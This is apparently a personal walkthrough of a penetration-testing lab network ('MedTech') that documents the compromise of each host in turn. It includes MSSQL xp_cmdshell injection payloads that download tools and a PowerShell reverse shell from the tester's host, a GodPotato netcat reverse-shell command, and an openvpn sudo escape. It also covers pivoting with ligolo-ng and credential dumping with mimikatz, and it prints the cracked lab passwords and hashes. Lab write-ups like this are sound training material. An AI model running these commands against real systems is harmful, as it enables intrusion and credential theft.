Main steps
1. 

Learning points
1. Do not run `mimikatz` in `evil-winrm` as it may cause the infinite loop issue and lock the account out.
2. If you see a binary that looks like it may be a scheduled task, just replace it and wait a while to see what happens.

IP Addresses (External):
1. `192.168.120.120`
2. `192.168.120.121`
3. `192.168.120.122`

`nmap`
`192.168.120.120`: Web server (Linux)
![[Pasted image 20260402044320.png]]

`192.168.120.121`: Web server (Windows)
![[Pasted image 20260402044415.png]]

Bunch of Windows ports open, `RPC`, SMB, `WinRM`

`192.168.120.122`: VPN Server (Linux)
![[Pasted image 20260402044432.png]]

The `192.168.120.122` server is a VPN server. Tried logging in with some default credentials: `offsec`:`password` and got access in a limited shell.
![[Pasted image 20260402171855.png]]

`sudo` was available on this limited shell, so I checked `sudo -l` and saw that `openvpn` could be run as `sudo` with no password. From GTFObins, running the command `openvpn --dev null --script-security 2 --up '/bin/sh -s'` as `sudo` will launch a privileged shell. Ran the command and got access as root, and retrieved both the user and root flags.
![[Pasted image 20260402172023.png]]

There is also another user on this machine named `mario`. Accessing their home folder shows that they have a SSH private key present.
![[Pasted image 20260403150823.png]]

Saved the key for possible later use.

The Linux webserver shows a static webpage with some text and a link to a HTML file with a welcome message.
![[Pasted image 20260402045710.png]]

There is also a `feed.xml` file that is linked on the page.
![[Pasted image 20260402045732.png]]

The Windows web server has a webpage with more text and links. There are a few input boxes, such as a search bar and a contact us form, but none of them seem to actually POST any data, looking at the source code.
![[Pasted image 20260402045912.png]]

Ran `Feroxbuster` against the `MedTech` website, and found a `login.aspx` directory.
![[Pasted image 20260402045951.png]]

This page states that it is the login for the Patient Portal.
![[Pasted image 20260402045959.png]]

Attempted to enumerate for SQL injection with a `'` mark in the username field, and got an error message from SQL, confirming that injection is possible.
![[Pasted image 20260402050109.png]]

Tried a few different SQL injection payloads to bypass the login page, such as `' OR 1=1; --` but would always get either a syntax error message, or just `Invalid credentials`.

I then assumed that the SQL backend code for logging in is different from the standard one, and the login cannot be bypassed, or possibly that the login does not even work. Since this is a Windows server, it should be running `MSSQL`, which is susceptible to RCE via SQL injection. Referring to the [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-comments) section on `MSSQL` Command Execution, I ran the SQL commands to enable the `xp_cmdshell`, then test if I had RCE with the payload:
```
'EXEC master.dbo.xp_cmdshell 'certutil.exe -urlcache -split -f http://192.168.45.160/winpeas.exe winpeas.exe';--
```
to see if my HTTP server received any requests.
![[Pasted image 20260402060055.png]]

And my HTTP server did receive the request, confirming that I now have RCE on the Windows server.
![[Pasted image 20260402060114.png]]

I attempted to get a reverse shell by uploading `nc64.exe` and running it using the payload:
```
'EXEC master.dbo.xp_cmdshell 'powershell \"IEX(New-Object Net.WebClient).downloadString(''http://192.168.45.160/powershellrev.ps1'')\"';--
```
and was able to get a reverse shell on my `nc` listener as the user `nt service\mssql$sqlexpress`.
![[Pasted image 20260402060911.png]]

Checked `net user` and `net user /domain` to enumerate usernames and found a few.
![[Pasted image 20260402061136.png]]

On this machine, `WEB02`, the only domain user with a home folder is `joe`.
![[Pasted image 20260402061234.png]]

Downloaded `WinPEAs` to the machine with `certutil` and ran it to begin enumerating possible privilege escalation routes.
![[Pasted image 20260402061839.png]]
![[Pasted image 20260402061908.png]]![[Pasted image 20260402062153.png]]
```
WEB02$::MEDTECH:1122334455667788:8587ea9c5711465ea0a3fb392e995f39:01010000000000009a1e072125c2dc01890aac2d5e118a69000000000800300030000000000000000000000000300000d8c929a18f8306528b604ac0f3f091c5301c8c3d9d4689b5c867902e15f0f4230a00100000000000000000000000000000000000090000000000000000000000
```

Found a few interesting things with `WinPEAs`, including a possible NTLM hash, as well as noticing that the account I am on has the `SeImpersonatePrivilege` token enabled. This may allow me to use a `Potato` exploit to escalate to `nt authority\system`.

Uploaded `GodPotato` to the machine with `certutil` and ran it, testing with a `whoami` command.
![[Pasted image 20260402062933.png]]

`whoami` returned `nt authority\system`, confirming that `GodPotato` works. I then opened a reverse shell with `.\GodPotato-NET4.exe -cmd ".\nc64.exe -nv -e cmd.exe 192.168.45.160 5555"` and got a shell as `nt authority\system`. Got the root flag with this account.
![[Pasted image 20260402063026.png]]

Uploaded `mimikatz.exe` to the server and ran `sekurlsa::logonpasswords`, and got the password for the user `joe`.
![[Pasted image 20260402063955.png]]

`joe`:` Flowers1 `

Also got the `administrator`'s NTLM hash, which I can use to `WinRM` by passing the hash for a stable shell.
`b2c03054c306ac8fc5f9d188710b0168`
![[Pasted image 20260402064943.png]]

Enumerated `joe`'s home directory and found a `test.zip` file in `downloads`.
![[Pasted image 20260402170605.png]]

Exfiltrated the file and unzipped it. It seems to be the `MedTech` webpage source code.
![[Pasted image 20260402170829.png]]

In the `web.config` file, I  found credentials for the `localhost\SQLEXPRESS` database - ` WhileChirpTuesday218 `.
![[Pasted image 20260402171129.png]]

There doesn't seem to be an SQL server running on this machine. `joe` also does not seem to have any privileges here.

Now that I have administrator access over `WEB02`, I can begin to port forward to enumerate the internal network. I tried port forwarding with SSH and `plink` but was unsuccessful, so I used `ligolo-ng`.

Ran the following commands to set up the network interface.
```
sudo ip tuntap add user cyrus mode tun ligolo
sudo ip link set ligolo up
```
![[Pasted image 20260402174834.png]]

Started the `ligolo-proxy` with `sudo ligolo-proxy -selfcert -laddr 0.0.0.0:9998`.
![[Pasted image 20260402174916.png]]

On the Windows machine, I uploaded the agent and ran it with `.\agent.exe -connect 192.168.45.160:9998 -ignore-cert`.
![[Pasted image 20260402174946.png]]

Added the internal subnet to the interface created before with `sudo ip route add 172.16.120.0/24 dev ligolo`, then selected the session in the `ligolo-ng` shell and started the connection with `start`.
![[Pasted image 20260402175135.png]]

Now I am able to reach the internal network directly from my Kali to begin reconnaissance.

Internal hosts:
1. `172.16.120.10`
2. `172.16.120.11`
3. `172.16.120.12`
4. `172.16.120.13`
5. `172.16.120.14`
6. `172.16.120.82`
7. `172.16.120.83`

`nmap` scans:

`172.16.120.10`: DC01
![[Pasted image 20260402175806.png]]

`172.16.120.11`: FILES02
![[Pasted image 20260402180202.png]]

`172.16.120.12`: DEV04 (RDP open)
![[Pasted image 20260402180611.png]]

`172.16.120.13`: PROD01
![[Pasted image 20260402181246.png]]

`172.16.120.14`: Unknown - likely Linux
![[Pasted image 20260402181638.png]]

Since the SSH port is open, I tried using the private key for `mario` I found earlier. Got SSH access and retrieved the user flag.
![[Pasted image 20260403151042.png]]

`172.16.120.82`: CLIENT01 (RDP open)
![[Pasted image 20260402182417.png]]

`172.16.120.83`: CLIENT02
![[Pasted image 20260402183511.png]]

CLIENT01 and CLIENT02 both have port 5040 open with an unknown service.

Ran `nxc smb` with the usernames and passwords I found against the list of hosts to enumerate SMB shares, and found that `joe` is able to read the shares in FILES02, DEV04, CLIENT01, CLIENT02, and PROD01. `joe` has full permissions over the shares in FILES02.
![[Pasted image 20260402184025.png]]

Checked `WinRM` as well, and found that `joe` has `WinRM` permissions on FILES02.\
![[Pasted image 20260402184059.png]]

Based on these findings, the next step would be FILES02.

Checked SMB first with `joe`, but there was nothing in the TEMP share. The C share just returns the C drive.
![[Pasted image 20260402184451.png]]

Got access as `joe` on FILES02 with `evil-winrm` and retrieved the user flag.
![[Pasted image 20260402184600.png]]

Checking `whoami /all` shows that `joe` is part of the `Administrators` local group.
![[Pasted image 20260402184652.png]]

Retrieved the root flag with `joe` from the administrator desktop.
![[Pasted image 20260402184749.png]]

`joe` has the `SeImpersonatePrivilege` token enabled, so I may be able to escalate to `nt authority\system` with `GodPotato`.

`joe` is also already a local administrator, so I may be able to directly run `mimikatz` to get hashes of other logged on users - `wario` and `yoshi`  both have home directories on this machine. I can do this with either `mimikatz` or try using `impacket-secretsdump`.

Dumped the hashes from FILES02 with `impacket-secretsdump` and got the hashes for the local administrator, the domain administrator, `yoshi`, and `wario`.
![[Pasted image 20260403105244.png]]

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f1014ac49bae005ee3ece5f47547d185
MEDTECH.COM/Administrator:$DCC2$10240#Administrator#a7c5480e8c1ef0ffec54e99275e6e0f7
MEDTECH.COM/yoshi:$DCC2$10240#yoshi#cd21be418f01f5591ac8df1fdeaa54b6
MEDTECH.COM/wario:$DCC2$10240#wario#b82706aff8acf56b6c325a6c2d8c338a
```

Ran the hashed through `hashcat -m 2100` and cracked `yoshi` and `wario`'s passwords.
![[Pasted image 20260403113840.png]]

`yoshi`: ` Mushroom! `
`wario`: ` Mushroom! `

Ran `nxc winrm` against all the internal hosts with the above credentials, and found that `wario` has `WinRM` access to CLIENT02.
![[Pasted image 20260403122313.png]]

Got a shell with `evil-winrm` as `wario` and retrieved the user flag.
![[Pasted image 20260403124736.png]]

Uploaded `WinPEAs` to begin enumerating privilege escalation vectors.

According to `WinPEAs`, there is a service named `auditTracker` with a binary that is fully accessible by everyone on the machine. This service is also on `Autoload`, so it should automatically start when the machine restarts.
![[Pasted image 20260403125501.png]]

I tried manually enumerating services to get more information, but the `wario` user does not have the permissions required to query services on this machine.
![[Pasted image 20260403131745.png]]

However, the user does have the `SeShutdownPrivilege` token, so I can try replacing this binary with a malicious binary and restarting the system.

Uploaded a binary that will create a new user and add it to the administrators group, then tried restarting the system. Unfortunately, it seems that even though `wario` has the shutdown privilege, access to `shutdown.exe`  is denied.
![[Pasted image 20260403132643.png]]

I then tried restarting the service manually. `net stop && net start` did not work, but I found that I could run `sc.exe start auditTracker` to run the service.
![[Pasted image 20260403132744.png]]

I ran the service and successfully added the user `dave2` to the local administrators group.
![[Pasted image 20260403132831.png]]

I then realized that I have no way of actually connecting to this account through `WinRM` (not sure why - local administrators should be able to?), so instead I generated a reverse shell executable with `msfvenom`, and added the `listener_add` line to `ligolo` to receive reverse shells, then uploaded this binary and ran the service again to get a reverse shell as `nt authority\system`.
![[Pasted image 20260403134545.png]]![[Pasted image 20260403134554.png]]
![[Pasted image 20260403134606.png]]

Uploaded and ran `mimikatz` and got the `Administrator` account NTLM hash.
`:00fd074ec24fd70c76727ee9b2d7aacd`

Also uploaded and ran `SharpHound` to collect AD data.

Since there were no other users logged on to CLIENT02, there were no credentials to be harvested here. Back to enumerating hosts, I tried the user `yoshi` with `Mushroom!` on SMB, and noticed that this user has READ, WRITE access on CLIENT01's shares.
![[Pasted image 20260403140350.png]]

Tried accessing CLIENT01 with `yoshi`'s credentials using `impacket-psexec` and got a shell as `nt authority\system`.
![[Pasted image 20260403140449.png]]

Uploaded `mimikatz` and got the NTLM hash for CLIENT01's `Administrator`.
`aad3b435b51404eeaad3b435b51404ee:f26c0186c8ffcceb01fd2d7549e7ac1f`

`lsadump::cache` returned a hash of `MEDTECH\Administrator`.
![[Pasted image 20260403140957.png]]
`$DCC2$10240#Administrator#43ef2da7af4764456e2156f04d48eebe`
Was unable to crack this hash.

Back to password spraying: found that `yoshi` has RDP access to DEV04.
![[Pasted image 20260403142809.png]]

Got RDP access to DEV04 and retrieved the user flag.
![[Pasted image 20260403142933.png]]

Uploaded and ran `WinPEAs`. There appears to be an interesting binary named `backup.exe` that the user `yoshi` can edit.
![[Pasted image 20260403143719.png]]

Seems like a possible scheduled task running this executable to back something up. However, there is nothing in the task scheduler or `schtasks`. Since nothing else interesting was flagged, I tried replacing this binary with a reverse shell binary that I generated with `msfvenom`.

After about a minute, I received a reverse shell on my `nc` listener as `nt authority\system` on DEV04.
![[Pasted image 20260403152532.png]]

Uploaded `mimikatz` to begin harvesting credentials. From the earlier `WinPEAs` output, there is another domain user named `leon` logged in to this machine, so I should be able to get their credentials.
![[Pasted image 20260403152951.png]]

Managed to get both the hash and plaintext password for `leon`.
`leon`:` rabbit:) `

Based on my earlier `BloodHound` scan, I know that `leon` is a member of the `Domain Admins` group, and a local admin on DC01.
![[Pasted image 20260403153206.png]]

![[Pasted image 20260403153301.png]]

Got access with `evil-winrm` on DC01 as `leon`.
![[Pasted image 20260403153400.png]]

There was no user flag on this machine, only the root flag.
`leon`'s desktop also contained a file named `credentials.txt`. This file contains plaintext credentials for the WEB01 server.
![[Pasted image 20260403153602.png]]

`offsec`: ` century62hisan51 `

Since `leon` is a domain admin, I tried logging in to PROD01 as well, and was successful.
![[Pasted image 20260403153801.png]]

That only leaves WEB01, which I was able to directly SSH into with the credentials above.
![[Pasted image 20260403154021.png]]

The `offsec` user is able to run `sudo` with all commands with no password, so I simply retrieved the root flag with a `sudo cat`.
![[Pasted image 20260403154107.png]]

